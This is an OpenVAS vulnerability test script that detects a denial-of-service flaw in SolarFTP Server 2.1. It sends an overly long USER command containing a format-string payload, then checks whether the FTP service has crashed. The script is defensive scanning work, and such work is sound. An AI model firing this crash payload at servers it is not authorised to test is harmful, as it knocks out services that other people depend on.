###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_solar_ftp_user_cmd_dos_vuln.nasl 13347 2019-01-29 15:54:59Z cfischer $
#
# SolarFTP USER Command Remote Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802001");
  script_version("$Revision: 13347 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-29 16:54:59 +0100 (Tue, 29 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)");
  script_bugtraq_id(46504);
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("SolarFTP USER Command Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp_banner/available");

  script_xref(name:"URL", value:"http://secunia.com/advisories/42834");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/65574");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16204");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98647/solarftp-dos.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
  denial of service.");

  script_tag(name:"affected", value:"Flexbyte Software Solar FTP Server 2.1, other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is due to format string error while parsing 'USER'
  command, which can be exploited to crash the FTP service by sending 'USER'
  command with an overly long username parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running SolarFTP Server and is prone to denial of
  service vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(!banner || "Solar FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

resp = ftp_recv_line(socket:soc);
if(!resp || "Solar FTP Server" >!< resp){
  ftp_close(socket:soc);
  exit(0);
}

attackReq = crap(data: raw_string(0x41), length: 50) + '%x%lf%f%d%c%s%c%u%n%s%c%lf%tt%d%c';

attack = string("USER ", attackReq, "\r\n");
send(socket:soc, data:attack);
resp = recv_line(socket:soc, length:260);

ftp_close(socket:soc);

soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  security_message(port:ftpPort);
  exit(0);
}

resp = recv_line(socket:soc1, length:100);
ftp_close(socket:soc1);
if(!resp || "Solar FTP Server" >!< resp){
  security_message(port:ftpPort);
  exit(0);
}